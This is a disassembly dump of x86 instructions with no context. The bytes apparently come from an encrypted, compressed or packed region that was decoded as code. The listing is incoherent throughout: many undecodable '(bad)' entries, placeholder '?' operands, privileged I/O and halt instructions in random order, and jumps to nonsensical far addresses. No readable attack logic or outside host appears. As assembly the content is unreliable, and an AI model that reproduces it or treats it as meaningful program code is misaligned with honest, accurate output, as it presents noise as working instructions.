  404234:	adc    al,0xee
  404236:	inc    edi
  404237:	cmove  esi,ecx
  40423a:	(bad)  
  40423b:	pop    ecx
  40423c:	mov    ecx,0x551e62f4
  404241:	jge    0x404289
  404243:	sub    al,BYTE PTR [edi]
  404245:	int3   
  404246:	int    0xd6
  404248:	ret    
  404249:	mov    eax,ds:0x72b0e220
  40424e:	sar    ah,0x9c
  404251:	xor    edx,eax
  404253:	gs test eax,0x892bfc1b
  404259:	scas   al,BYTE PTR es:[edi]
  40425a:	dec    edi
  40425b:	enter  0x9923,0x1c
  40425f:	cmp    BYTE PTR [ecx+0x4c59a45c],dl
  404265:	push   edx
  404266:	xor    BYTE PTR [edi+eiz*4],0x49
  40426a:	je     0x404295
  40426c:	mov    ebx,0x8e6a6d09
  404271:	repnz neg DWORD PTR [ebp+eiz*8-0x27be3920]
  404279:	push   ebp
  40427a:	sub    ecx,ebp
  40427c:	jl     0x404275
  40427e:	mov    edx,0xc5f6bb35
  404283:	sahf   
  404284:	mov    ds:0xb21a2623,eax
  404289:	add    cl,dl
  40428b:	ins    DWORD PTR es:[edi],dx
  40428c:	sub    DWORD PTR [ebx+0x6cf8b55f],ebp
  404292:	je     0x40425b
  404294:	mov    eax,0xb48d8449
  404299:	dec    eax
  40429a:	loop   0x404299
  40429c:	lods   al,BYTE PTR ds:[esi]
  40429d:	sub    cl,dl
  40429f:	pop    ecx
  4042a0:	dec    esp
  4042a1:	cmc    
  4042a2:	jae    0x404228
  4042a4:	inc    eax
  4042a5:	or     eax,0xddfe3883
  4042aa:	in     al,dx
  4042ab:	fmul   DWORD PTR [ecx-0x24e38e2a]
  4042b1:	loopne 0x404281
  4042b3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4042b4:	out    dx,eax
  4042b5:	hlt    
  4042b6:	mov    esp,?
  4042b8:	mov    esi,0xe637dba0
  4042bd:	xchg   BYTE PTR [edx+0x2790ed53],al
  4042c3:	dec    edi
  4042c4:	jp     0x4042db
  4042c6:	inc    edx
  4042c7:	jmp    0x404331
  4042c9:	xor    esi,eax
  4042cb:	mov    edi,eax
  4042cd:	sar    BYTE PTR [ecx+0x2d],1
  4042d0:	add    ebp,DWORD PTR [eax-0x67]
  4042d3:	adc    dh,dl
  4042d5:	xor    BYTE PTR [eax-0x37],dh
  4042d8:	pop    ds
  4042d9:	test   BYTE PTR [edi-0x559f633b],bh
  4042df:	mov    dh,0xab
  4042e1:	jle    0x4042ee
  4042e3:	mov    al,ah
  4042e5:	out    dx,al
  4042e6:	jmp    0x49e7:0x3c1c03d
  4042ed:	mov    al,ds:0x5e00a40c
  4042f2:	jo     0x404288
  4042f4:	pop    eax
  4042f5:	pop    ebp
  4042f6:	cmp    bh,BYTE PTR [ebp-0xb]
  4042f9:	add    dh,cl
  4042fb:	sub    al,0xe0
  4042fd:	gs gs je 0x404303
  404301:	cli    
  404302:	jecxz  0x40437d
  404304:	cmp    BYTE PTR [edi],bh
  404306:	cli    
  404307:	mov    dh,BYTE PTR [edx]
  404309:	(bad)  
  40430a:	das    
  40430b:	arpl   WORD PTR [esi],di
  40430d:	in     al,0x64
  40430f:	les    edx,FWORD PTR ds:0xe96957fd
  404315:	cmp    BYTE PTR [edx],dh
  404317:	adc    edx,ebx
  404319:	shl    BYTE PTR [ebx+ebp*1],0xd9
  40431d:	stos   DWORD PTR es:[edi],eax
  40431e:	out    0xe4,al
  404320:	rol    DWORD PTR [eax],0x18
  404323:	lock sti 
  404325:	mov    edi,0x2eed9f34
  40432a:	pop    ebp
  40432b:	cmp    al,0x82
  40432d:	add    eax,DWORD PTR [ebx]
  40432f:	cmp    eax,0xc600f28c
  404334:	bound  edi,QWORD PTR [eax+0x50]
  404337:	jno    0x404363
  404339:	jb     0x4042da
  40433b:	sub    DWORD PTR [esi+0x4b],ebx
  40433e:	push   ds
  40433f:	aas    
  404340:	mov    ds:0x1c990b3f,eax
  404345:	dec    ebx
  404346:	das    
  404347:	lock je 0x4043a6
  40434a:	pushf  
  40434b:	pop    ebp
  40434c:	xchg   ecx,eax
  40434d:	mov    dl,0x34
  40434f:	in     eax,dx
  404350:	in     al,0x61
  404352:	gs ins DWORD PTR es:[edi],dx
  404354:	inc    eax
  404355:	pushf  
  404356:	sub    BYTE PTR ds:0x5893fa5e,ah
  40435c:	sti    
  40435d:	std    
  40435e:	xchg   dl,bh
  404360:	xor    ebx,DWORD PTR [esi-0x61a7deae]
  404366:	add    eax,0x1b7f3bb7
  40436b:	add    BYTE PTR [eax+0x68],cl
  40436e:	sub    al,BYTE PTR [edi+ebx*2-0x37f72c78]
  404375:	push   ebp
  404376:	scas   eax,DWORD PTR es:[edi]
  404377:	and    al,ch
  404379:	xchg   ebp,eax
  40437a:	mov    esp,0x3c7453ed
  40437f:	and    al,0x52
  404381:	es out dx,eax
  404383:	and    al,0x29
  404385:	jp     0x40434d
  404387:	jmp    0x8c68:0x6abc66ab
  40438e:	mov    edi,0x7a86cf49
  404393:	or     BYTE PTR [ebx-0x74],al
  404396:	mov    WORD PTR [ecx-0x36df7e17],es
  40439c:	call   0x1eece385
  4043a1:	mov    ecx,0x396030ec
  4043a6:	sub    ebp,eax
  4043a8:	jmp    0x7b86:0x403be1fe
  4043af:	pop    ebp
  4043b0:	and    BYTE PTR [esi],al
  4043b2:	fnstenv [ebx]
  4043b4:	es clc 
  4043b6:	test   BYTE PTR [eax],ch
  4043b8:	cli    
  4043b9:	adc    eax,DWORD PTR [ecx-0x2f137628]
  4043bf:	retf   0x1cd1
  4043c2:	in     eax,0xf0
  4043c4:	add    DWORD PTR [esi-0x10],ebx
  4043c7:	aad    0x5f
  4043c9:	fwait
  4043ca:	pop    ds
  4043cb:	gs mov dl,0xb6
  4043ce:	test   al,0x26
  4043d0:	test   DWORD PTR [ecx-0x7c],0x43b7bf0b
  4043d7:	das    
  4043d8:	mov    bl,0xe
  4043da:	clc    
  4043db:	mov    bl,0xb4
  4043dd:	das    
  4043de:	mov    edi,0x46199336
  4043e3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4043e4:	ins    DWORD PTR es:[edi],dx
  4043e5:	cmp    ah,BYTE PTR [edx-0x5f]
  4043e8:	loopne 0x4043d3
  4043ea:	bound  esp,QWORD PTR [ebp-0x40dafa2]
  4043f0:	mov    ds:0x202b8e9e,eax
  4043f5:	mov    edx,0x9fc31b7d
  4043fa:	pop    ebp
  4043fb:	cmp    eax,0xe727847b
  404400:	outs   dx,BYTE PTR ds:[esi]
  404401:	add    ch,ch
  404403:	les    eax,FWORD PTR [edi]
  404405:	xchg   al,al
  404407:	in     eax,dx
  404408:	mov    edi,0xb94653b5
  40440d:	inc    BYTE PTR ds:0xad0747a3
  404413:	(bad)  
  404414:	hlt    
  404415:	addr16 ja 0x40442b
  404418:	stos   DWORD PTR es:[edi],eax
  404419:	jl     0x404474
  40441b:	add    al,cl
  40441d:	ds sub eax,0x586d6743
  404423:	mov    edi,DWORD PTR [edi]
  404425:	sar    BYTE PTR [ecx-0x37],cl
  404428:	sub    eax,0x1b640498
  40442d:	popf   
  40442e:	jle    0x40442e
  404430:	sahf   
  404431:	and    ebx,eax
  404433:	out    dx,al
  404434:	or     ah,BYTE PTR ss:[eax]
  404437:	cli    
  404438:	hlt    
  404439:	jbe    0x40446c
  40443b:	jb     0x404490
  40443d:	jns    0x40441f
  40443f:	push   ebp
  404440:	xchg   esi,eax
  404441:	enter  0x418b,0x8f
  404445:	jnp    0x404404
  404447:	ret    0xab9d
  40444a:	pop    esi
  40444b:	mov    cl,0xc8
  40444d:	inc    ebp
  40444e:	push   edx
  40444f:	in     eax,dx
  404450:	pop    ds
  404451:	sub    esi,DWORD PTR [ecx-0x1d]
  404454:	sub    BYTE PTR [edx-0x3570838c],dl
  40445a:	fcom   QWORD PTR [ebx+ecx*1+0xf3dacb9]
  404461:	rol    edi,cl
  404463:	js     0x4044cb
  404465:	pop    ebp
  404466:	or     al,0x68
  404468:	in     eax,dx
  404469:	fbld   TBYTE PTR [esi-0xbee5b30]
  40446f:	inc    ecx
  404470:	sub    bl,BYTE PTR [esi-0x19e93516]
  404476:	scas   al,BYTE PTR es:[edi]
  404477:	rcl    edi,0x11
  40447a:	es dec edi
  40447c:	(bad)  
  40447d:	gs xor eax,0x376f6e83
  404483:	xchg   edi,eax
  404484:	pop    ecx
  404485:	(bad)  
  404486:	outs   dx,BYTE PTR ds:[esi]
  404487:	iret   
  404488:	lea    eax,[ebx-0x69]
  40448b:	sub    esp,DWORD PTR [ecx+0x5a68cd41]
  404491:	test   eax,0x881092d2
  404496:	ds lahf 
  404498:	cmp    al,dl
  40449a:	arpl   WORD PTR [eax],dx
  40449c:	jne    0x404484
  40449e:	test   DWORD PTR [esi-0x195996ad],eax
  4044a4:	and    eax,0x9f039a30
  4044a9:	pushf  
  4044aa:	(bad)  
  4044ab:	add    DWORD PTR [eax],0x70152133
  4044b1:	mov    bh,0x31
  4044b3:	stos   DWORD PTR es:[edi],eax
  4044b4:	xchg   ebx,eax
  4044b5:	retf   0x5b1a
  4044b8:	mul    cl
  4044ba:	push   es
  4044bb:	aad    0x95
  4044bd:	mov    ds:0x8d76d6bb,eax
  4044c2:	adc    DWORD PTR [ebx],0x4e90d2d5
  4044c8:	in     eax,dx
  4044c9:	(bad)  
  4044cb:	fwait
  4044cc:	mov    eax,ds:0x93a88784
  4044d1:	mul    DWORD PTR [ebp+0x4e64bde7]
  4044d7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4044d8:	js     0x4044fc
  4044da:	inc    esi
  4044db:	test   DWORD PTR [eax],edx
  4044dd:	cdq    
  4044de:	mov    eax,0x106f2a6a
  4044e3:	aas    
  4044e4:	jl     0x4044de
  4044e6:	sbb    esi,DWORD PTR [eax]
  4044e8:	scas   eax,DWORD PTR es:[edi]
  4044e9:	lods   al,BYTE PTR ds:[esi]
  4044ea:	push   ebp
  4044eb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4044ec:	lods   eax,DWORD PTR ds:[esi]
  4044ed:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4044ee:	and    eax,0xc82c9ca1
  4044f3:	test   BYTE PTR [eax-0x35],bl
  4044f6:	test   al,0x62
  4044f8:	in     eax,0xcf
  4044fa:	mov    ?,WORD PTR [edi]
  4044fc:	add    bh,BYTE PTR [edx+0xb]
  4044ff:	or     eax,0xe16c146f
  404504:	sub    ah,BYTE PTR [esp+ebx*2+0x6c]
  404508:	ret    
  404509:	push   esi
  40450a:	push   0x3b997605
  40450f:	adc    al,0x74
  404511:	fwait
  404512:	test   DWORD PTR [eax-0x5b],0x1d31d627
  404519:	pop    ss
  40451a:	xchg   esp,eax
  40451b:	sub    BYTE PTR [ebx-0x4969154b],dh
  404521:	popa   
  404522:	stos   BYTE PTR es:[edi],al
  404523:	outs   dx,DWORD PTR ds:[esi]
  404524:	sti    
  404525:	push   edi
  404526:	or     BYTE PTR [ecx],al
  404528:	cmp    al,0x65
  40452a:	out    dx,eax
  40452b:	mul    BYTE PTR [edx-0x72b61b20]
  404531:	jmp    0x61b3e68b
  404536:	dec    esp
  404537:	sbb    al,0x64
  404539:	(bad)  
  40453a:	mov    esi,0x3e0bc926
  40453f:	pop    esi
  404540:	mov    esi,ecx
  404542:	dec    eax
  404543:	xor    DWORD PTR [ebx-0x59],ebp
  404546:	xor    dl,al
  404548:	push   0x2d9773cb
  40454d:	ins    BYTE PTR es:[edi],dx
  40454e:	lods   al,BYTE PTR ds:[esi]
  40454f:	dec    eax
  404550:	cmp    bh,BYTE PTR [edi]
  404552:	fild   DWORD PTR [edx-0x17d0f779]
  404558:	inc    ebp
  404559:	repnz addr16 push ebx
  40455c:	(bad)
  40455f:	or     BYTE PTR [edi-0x4af681dd],ah
  404565:	bound  edx,QWORD PTR [edx]
  404567:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404568:	aas    
  404569:	xor    ecx,DWORD PTR [ebx+edi*1]
  40456c:	scas   eax,DWORD PTR es:[edi]
  40456d:	push   ebx
  40456e:	xchg   ebx,eax
  40456f:	sub    bh,bl
  404571:	xlat   BYTE PTR ds:[ebx]
  404572:	jo     0x40454e
  404574:	lds    edx,FWORD PTR [esi]
  404576:	mov    esp,0x76155fa0
  40457b:	loope  0x404573
  40457d:	pop    ss
  40457e:	ja     0x404507
  404580:	call   DWORD PTR [ebp+0x383afd0d]
  404586:	hlt    
  404587:	mov    bl,0xc7
  404589:	leave  
  40458a:	jno    0x40450e
  40458c:	stos   DWORD PTR es:[edi],eax
  40458d:	push   cs
  40458e:	mov    al,0x8f
  404590:	mov    ebx,0xffb3890d
  404595:	scas   eax,DWORD PTR es:[edi]
  404596:	push   0xee2630cb
  40459b:	sti    
  40459c:	push   ebx
  40459d:	push   cs
  40459e:	jbe    0x40458c
  4045a0:	bound  ebx,QWORD PTR [ecx+0x1ba1d0de]
  4045a6:	mov    ebx,0xf2df3591
  4045ab:	shl    dh,1
  4045ad:	or     eax,0x64d96eb
  4045b2:	mov    bh,0xde
  4045b4:	jmp    0x51e247be
  4045b9:	or     ebx,edi
  4045bb:	jno    0x4045f6
  4045bd:	mov    ds:0x97d83ba9,eax
  4045c2:	outs   dx,DWORD PTR ds:[esi]
  4045c3:	ss pop ebp
  4045c5:	jne    0x4045e5
  4045c7:	dec    ebx
  4045c8:	test   eax,0xfd252133
  4045cd:	cld    
  4045ce:	push   ss
  4045cf:	pop    ebp
  4045d0:	(bad)  
  4045d1:	fimul  WORD PTR [edi]
  4045d3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4045d4:	jno    0x40459e
  4045d6:	stc    
  4045d7:	dec    ecx
  4045d8:	push   cs
  4045d9:	fmul   QWORD PTR [esi-0x5fb31235]
  4045df:	jno    0x4045f8
  4045e1:	dec    eax
  4045e2:	or     edx,DWORD PTR [ebp+0x52]
  4045e5:	dec    edx
  4045e6:	push   ecx
  4045e7:	dec    edx
  4045e8:	dec    ebx
  4045e9:	cs pop ebp
  4045eb:	(bad)  
  4045ec:	cmp    edx,ebp
  4045ee:	(bad)  
  4045ef:	inc    ax
  4045f1:	daa    
  4045f2:	mov    esp,0xee102f2b
  4045f7:	push   es
  4045f8:	arpl   WORD PTR [edi],cx
  4045fa:	dec    ebx
  4045fb:	aad    0x8d
  4045fd:	pop    ecx
  4045fe:	(bad)  
  4045ff:	in     al,0xf
  404601:	push   esp
  404602:	mov    ds:0x16435e4e,al
  404607:	sbb    BYTE PTR [esi],ch
  404609:	add    edi,DWORD PTR [eax+0x36]
  40460c:	mov    eax,DWORD PTR ds:0x8e32985f
  404612:	and    dl,BYTE PTR [ebx+0x190d723d]
  404618:	sub    eax,0x8c57c2ca
  40461d:	jge    0x404619
  40461f:	fnstenv [ecx-0x63]
  404622:	cli    
  404623:	bnd ret 0x5630
  404627:	jle    0x404639
  404629:	repnz and edx,DWORD PTR [edx+0xe]
  40462d:	int3   
  40462e:	add    al,0x38
  404630:	fwait
  404631:	or     edx,DWORD PTR [esi+edx*4-0x2dbbf026]
  404638:	mov    ecx,0x70a81f47
  40463d:	jbe    0x404672
  40463f:	mov    eax,0x5be4e828
  404644:	leave  
  404645:	or     DWORD PTR [eax],esp
  404647:	pop    ecx
  404648:	lock sahf 
  40464a:	sbb    edx,DWORD PTR ds:0x4c0916cf
  404650:	sahf   
  404651:	loopne 0x40468c
  404653:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404654:	jo     0x4045db
  404656:	sbb    eax,0x44f643
  40465b:	push   esi
  40465c:	push   ebx
  40465d:	out    dx,eax
  40465e:	sbb    al,0x2
  404660:	jecxz  0x404684
  404662:	or     eax,0x38bf02c4
  404667:	jns    0x404610
  404669:	mov    ebp,0x893694a6
  40466e:	in     eax,0xdc
  404670:	data16 sbb al,0x8b
  404673:	inc    edi
  404674:	hlt    
  404675:	inc    edi
  404676:	xchg   edx,eax
  404677:	popf   
  404678:	ja     0x404663
  40467a:	cwde   
  40467b:	sbb    edi,DWORD PTR [esi]
  40467d:	sub    DWORD PTR [ebx-0x986a332],ebx
  404683:	ins    DWORD PTR es:[edi],dx
  404684:	(bad)  
  404686:	in     eax,0xd6
  404688:	shl    DWORD PTR ds:0x88501d33,1
  40468e:	iret   
  40468f:	inc    esp
  404690:	cmp    eax,0xa46edd48
  404695:	dec    ebp
  404696:	xor    eax,DWORD PTR [eax-0x8cc6814]
  40469c:	xlat   BYTE PTR ds:[ebx]
  40469d:	repnz das 
  40469f:	(bad)  
  4046a0:	stos   DWORD PTR es:[edi],eax
  4046a1:	cmp    esp,DWORD PTR [edi-0x43]
  4046a4:	jecxz  0x4046bf
  4046a6:	retf   0x1905
  4046a9:	adc    DWORD PTR [ecx-0x1b24b716],edi
  4046af:	lods   eax,DWORD PTR ds:[esi]
  4046b0:	jae    0x404666
  4046b2:	sub    DWORD PTR [edx-0x2b],ecx
  4046b5:	push   eax
  4046b6:	push   ebp
  4046b7:	stos   BYTE PTR es:[edi],al
  4046b8:	mov    dh,0x4
  4046ba:	loope  0x404708
  4046bc:	pop    ebp
  4046bd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4046be:	mov    ds:0x1d3b06f8,al
  4046c3:	int    0xde
  4046c5:	mov    eax,0x94262544
  4046ca:	aaa    
  4046cb:	sbb    al,0x91
  4046cd:	jo     0x40466f
  4046cf:	fcomp  st(2)
  4046d1:	ficomp DWORD PTR [esi+esi*1-0x1]
  4046d5:	vaddsubps xmm3,xmm6,xmm2
  4046d9:	push   ebp
  4046da:	stc    
  4046db:	mov    esi,edx
  4046dd:	div    BYTE PTR [eax+0x18f369a]
  4046e3:	xchg   edx,eax
  4046e4:	outs   dx,DWORD PTR ds:[esi]
  4046e5:	ins    BYTE PTR es:[edi],dx
  4046e6:	neg    DWORD PTR [ebp-0x4639574b]
  4046ec:	or     bh,BYTE PTR [ebp-0x59]
  4046ef:	mov    dh,0x47
  4046f1:	push   0xffffffef
  4046f3:	add    ah,al
  4046f5:	sbb    bh,BYTE PTR [ecx+0x33]
  4046f8:	neg    DWORD PTR [ecx+0x11]
  4046fb:	mov    ch,0xcc
  4046fd:	add    DWORD PTR [edi+0x59],ebx
  404700:	aaa    
  404701:	int3   
  404702:	pop    eax
  404703:	int    0x3a
  404705:	inc    esi
  404706:	mov    bh,0x56
  404708:	sub    DWORD PTR es:[ebx+0x1f],ebx
  40470c:	lock cmp al,BYTE PTR [eax*4+0xa2b4fe1]
  404714:	pop    ebp
  404715:	fisubr DWORD PTR [esi+0x4f37f638]
  40471b:	std    
  40471c:	icebp  
  40471d:	out    dx,al
  40471e:	inc    esp
  40471f:	pop    DWORD PTR [ebp-0x39]
  404722:	ret    
  404723:	xor    al,0xe8
  404725:	sbb    DWORD PTR [eax],ebp
  404727:	cs jmp 0xc15d:0x5d71c816
  40472f:	jno    0x404750
  404731:	in     eax,dx
  404732:	loop   0x404737
  404734:	retf   0xd132
  404737:	(bad)  
  404739:	lahf   
  40473a:	mov    al,0x41
  40473c:	dec    esp
  40473d:	out    dx,eax
  40473e:	jl     0x404779
  404740:	imul   eax,DWORD PTR [ecx],0x4b501cad
  404746:	arpl   bx,si
  404748:	sub    ch,bh
  40474a:	lahf   
  40474b:	ss (bad) 
  40474d:	adc    ebp,DWORD PTR [ecx-0x11]
  404750:	push   0xffffff84
  404752:	call   0x64dc57e3
  404757:	pushf  
  404758:	push   ecx
  404759:	test   BYTE PTR [esi+0x18],bh
  40475c:	lods   eax,DWORD PTR ds:[esi]
  40475d:	cmp    eax,0x65b0ca49
  404762:	js     0x40479c
  404764:	cmp    BYTE PTR [ebx+ebp*1+0x225a9875],0xbe
  40476c:	mov    esi,DWORD PTR ds:0x6070f9b3
  404772:	out    0xd0,eax
  404774:	outs   dx,DWORD PTR ds:[esi]
  404775:	xor    al,0x8d
  404777:	loopne 0x4047c0
  404779:	jns    0x40471e
  40477b:	(bad)  [edi+ebx*4+0x36]
  40477f:	sar    BYTE PTR [edi-0x72],0xcf
  404783:	sub    BYTE PTR [ecx-0x7c],0x60
  404787:	push   0xffffffb7
  404789:	repz inc sp
  40478c:	cli    
  40478d:	arpl   di,si
  40478f:	sub    al,0x9f
  404791:	daa    
  404792:	xor    eax,0x5df63f8a
  404797:	add    dl,BYTE PTR [ecx+0x4d]
  40479a:	in     eax,0x39
  40479c:	adc    ebx,esp
  40479e:	ret    0xc489
  4047a1:	sti    
  4047a2:	inc    ecx
  4047a3:	call   0x10c72077
  4047a8:	sub    eax,0x2ebf36ea
  4047ad:	mov    ebp,0x5fe46bb1
  4047b2:	in     eax,0x34
  4047b4:	mov    ebp,0x54518f00
  4047b9:	push   ss
  4047ba:	inc    edi
  4047bb:	rol    BYTE PTR [ecx+0x2a635b2],0x10
  4047c2:	stos   BYTE PTR es:[edi],al
  4047c3:	imul   esp,DWORD PTR [ebx-0x57],0x35db160
  4047ca:	das    
  4047cb:	into   
  4047cc:	sub    eax,0xd780b980
  4047d1:	(bad)  
  4047d2:	fwait
  4047d3:	aam    0xcc
  4047d5:	or     DWORD PTR [esi+0x10ee9ee4],esp
  4047db:	icebp  
  4047dc:	jae    0x4047b1
  4047de:	std    
  4047df:	jg     0x404833
  4047e1:	ja     0x4047b1
  4047e3:	sbb    ah,dl
  4047e5:	and    eax,DWORD PTR [ebx-0x73ab0109]
  4047eb:	and    DWORD PTR [esi+0x69],ecx
  4047ee:	cld    
  4047ef:	(bad)
  4047f2:	in     al,dx
  4047f3:	pop    ds
  4047f4:	lea    esp,[esi]
  4047f6:	jp     0x404808
  4047f8:	and    bh,dh
  4047fa:	clc    
  4047fb:	mov    bl,0x91
  4047fd:	sti    
  4047fe:	jns    0x404841
  404800:	adc    BYTE PTR [edx+0x369fd11c],bl
  404806:	sbb    al,0x6b
  404808:	mov    dh,0x5a
  40480a:	cs (bad) 
  40480d:	pop    edx
  40480e:	lahf   
  40480f:	out    dx,al
  404810:	pop    edi
  404811:	(bad)  
  404812:	dec    ebx
  404813:	inc    ecx
  404814:	xchg   ebx,eax
  404815:	out    0x9b,al
  404817:	pop    esp
  404818:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404819:	outs   dx,BYTE PTR ds:[esi]
  40481a:	adc    BYTE PTR [esi+0x5d9da04f],0xfb
  404821:	sbb    al,0x99
  404823:	pusha  
  404824:	retf   
  404825:	xchg   esp,eax
  404826:	sub    al,BYTE PTR [eax-0x8cbe2b9]
  40482c:	(bad)  
  40482e:	jnp    0x40485a
  404830:	lea    eax,[ecx-0x1a]
  404833:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404834:	in     eax,0x53
  404836:	(bad)  
  404837:	push   esp
  404838:	cmp    eax,0xa068408
  40483d:	or     ecx,DWORD PTR [eax]
  40483f:	sti    
  404840:	jns    0x40489d
  404842:	inc    esi
  404843:	pop    esp
  404844:	std    
  404845:	ret    0x8635
  404848:	dec    eax
  404849:	in     eax,dx
  40484a:	fisttp QWORD PTR [ecx-0x7e7a3abd]
  404850:	mov    ecx,0xfd2eb013
  404855:	adc    ecx,DWORD PTR [ecx]
  404857:	daa    
  404858:	mov    ebx,0x3854a00e
  40485d:	xchg   edx,eax
  40485e:	scas   al,BYTE PTR es:[edi]
  40485f:	pop    esi
  404860:	in     eax,dx
  404861:	and    esp,esp
  404863:	add    esp,edx
  404865:	jae    0x40480a
  404867:	in     eax,dx
  404868:	cli    
  404869:	sti    
  40486a:	pop    esp
  40486b:	pop    ecx
  40486c:	pop    edx
  40486d:	mov    esp,0x7e8e9049
  404872:	outs   dx,DWORD PTR ds:[esi]
  404873:	adc    al,0x16
  404875:	loopne 0x4048f5
  404877:	mov    esp,0x84422e69
  40487c:	mov    BYTE PTR [edx-0x502db80],ch
  404882:	pop    ecx
  404883:	fstp   TBYTE PTR [edi]
  404885:	int3   
  404886:	sbb    DWORD PTR [edi-0x54dce185],0xffffff8c
  40488d:	cmp    ecx,edx
  40488f:	add    al,0x2d
  404891:	push   es
  404892:	into   
  404893:	xchg   esp,eax
  404894:	aad    0x8
  404896:	jmp    0xaed1:0x76ab1fe
  40489d:	xchg   ecx,ecx
  40489f:	sbb    ebx,DWORD PTR [ebp-0x7f4367e3]
  4048a5:	pop    ebx
  4048a6:	pop    eax
  4048a7:	cmp    BYTE PTR [ecx-0x21],dh
  4048aa:	cmp    eax,0x77ba2d15
  4048af:	fcom   DWORD PTR [ebx+ecx*4+0x44bad701]
  4048b6:	arpl   WORD PTR [edi],si
  4048b8:	sub    esp,ebx
  4048ba:	lea    eax,[esi]
  4048bc:	ret    
  4048bd:	outs   dx,DWORD PTR ds:[esi]
  4048be:	adc    eax,0xdfd8a219
  4048c3:	fistp  DWORD PTR [esi]
  4048c5:	push   edi
  4048c6:	push   0x3de4004c
  4048cb:	test   ch,al
  4048cd:	dec    esi
  4048ce:	shl    DWORD PTR [esi-0x39],1
  4048d1:	(bad)
  4048d4:	mov    BYTE PTR [ebx-0x50],al
  4048d7:	test   al,0x97
  4048d9:	jb     0x404897
  4048db:	add    dl,0xf9
  4048de:	pusha  
  4048df:	(bad)  
  4048e0:	icebp  
  4048e1:	(bad)  
  4048e2:	mov    ah,0x7b
  4048e4:	out    dx,al
  4048e5:	mov    ah,BYTE PTR [ebp+0x4c]
  4048e8:	xchg   BYTE PTR [eax-0x25],bh
  4048eb:	inc    ebx
  4048ec:	or     DWORD PTR [eax-0x266b8086],edi
  4048f2:	fsubr  st(6),st
  4048f4:	adc    eax,0x18bac29f
  4048f9:	mov    BYTE PTR [esi],ch
  4048fb:	arpl   dx,di
  4048fd:	or     dl,BYTE PTR [ebp+0x56]
  404900:	push   esi
  404901:	lahf   
  404902:	in     eax,0x1a
  404904:	jbe    0x4048e2
  404906:	nop
  404907:	pop    edx
  404908:	lods   al,BYTE PTR ds:[esi]
  404909:	push   edi
  40490a:	fidiv  WORD PTR [esi+0x32]
  40490d:	es jo  0x404899
  404910:	xor    DWORD PTR ds:[ebp-0x6a],0xd6aa7c18
  404918:	xchg   ebp,eax
  404919:	jbe    0x40491b
  40491b:	mov    al,BYTE PTR [ecx+0x36]
  40491e:	dec    esp
  40491f:	aad    0x15
  404921:	xor    BYTE PTR [ebx-0x2b017d45],al
  404927:	or     eax,0x5310f5a6
  40492c:	pop    ecx
  40492d:	xor    al,0xe7
  40492f:	xor    BYTE PTR [ecx+0x39],dh
  404932:	dec    edx
  404933:	es push es
  404935:	je     0x4049b2
  404937:	cmp    BYTE PTR [ebx-0x10e331e9],0x4c
  40493e:	or     DWORD PTR [ebp-0x7ccf9d],edx
  404944:	int3   
  404945:	inc    esi
  404946:	jnp    0x40497d
  404948:	inc    ebx
  404949:	lods   eax,DWORD PTR ds:[esi]
  40494a:	pop    ds
  40494b:	fwait
  40494c:	push   cs
  40494d:	(bad)  
  40494e:	and    eax,0xb4b2731
  404953:	rcr    DWORD PTR [ebp+0x24],cl
  404956:	xchg   DWORD PTR [eax+0x72cb3251],edx
  40495c:	xchg   esi,eax
  40495d:	sub    ebx,DWORD PTR [esi]
  40495f:	ret    
  404960:	mov    edx,0xe4cb4068
  404965:	mov    WORD PTR [edx],?
  404967:	(bad)  
  404968:	repz dec ebp
  40496a:	fimul  DWORD PTR [ecx+0x7eee7079]
  404970:	in     eax,dx
  404971:	sub    ebp,edx
  404973:	inc    BYTE PTR [ecx]
  404975:	push   ebp
  404976:	inc    ecx
  404977:	sbb    al,0x44
  404979:	or     eax,0x46503b61
  40497e:	(bad)  
  40497f:	loopne 0x4049f9
  404981:	or     al,0xf3
  404983:	push   edx
  404984:	xchg   ebx,eax
  404985:	(bad)  
  404986:	xchg   ebp,eax
  404987:	pop    edx
  404988:	loopne 0x404925
  40498a:	pop    edx
  40498b:	arpl   WORD PTR ds:0x7fbc67d8,di
  404991:	loop   0x40493f
  404993:	bound  ebx,QWORD PTR [ebp+0x7d]
  404996:	push   edi
  404997:	xor    dh,al
  404999:	push   ss
  40499a:	in     al,0xeb
  40499c:	pop    ecx
  40499d:	mov    cl,0xc9
  40499f:	out    0x70,eax
  4049a1:	dec    ebx
  4049a2:	mov    al,ds:0x1a195f74
  4049a7:	lods   al,BYTE PTR ds:[esi]
  4049a8:	(bad)  
  4049a9:	or     eax,0x3e735459
  4049ae:	ret    0x420d
  4049b1:	cmc    
  4049b2:	(bad)  
  4049b4:	push   eax
  4049b5:	(bad)  
  4049b6:	in     al,0x24
  4049b8:	enter  0xf3d6,0xbb
  4049bc:	ins    BYTE PTR es:[edi],dx
  4049bd:	pusha  
  4049be:	add    ebp,DWORD PTR [ebx+0x55]
  4049c1:	push   ecx
  4049c3:	or     BYTE PTR [ebx+0x1d],cl
  4049c6:	in     al,dx
  4049c7:	std    
  4049c8:	dec    esi
  4049c9:	std    
  4049ca:	loopne 0x40497f
  4049cc:	fldenv [ebx+ebx*1+0xf]
  4049d0:	adc    ah,dh
  4049d2:	rcr    ch,0x50
  4049d5:	push   ds
  4049d6:	xchg   ebx,eax
  4049d7:	pop    ebx
  4049d8:	mov    WORD PTR ds:0x7953e202,?
  4049de:	dec    ecx
  4049df:	inc    ecx
  4049e0:	push   DWORD PTR [esi+ebp*8-0x5365de55]
  4049e7:	inc    edi
  4049e8:	xchg   ebx,eax
  4049e9:	adc    al,0x73
  4049eb:	gs and bl,cl
  4049ee:	inc    esp
  4049ef:	push   es
  4049f0:	and    al,0xa3
  4049f2:	cli    
  4049f3:	push   ebp
  4049f4:	push   ss
  4049f5:	or     DWORD PTR gs:[edi-0x1ac73b1d],eax
  4049fc:	mov    dl,0xee
  4049fe:	clc    
  4049ff:	pusha  
  404a00:	mov    cl,0x37
  404a02:	mov    bl,0x51
  404a04:	jo     0x404a01
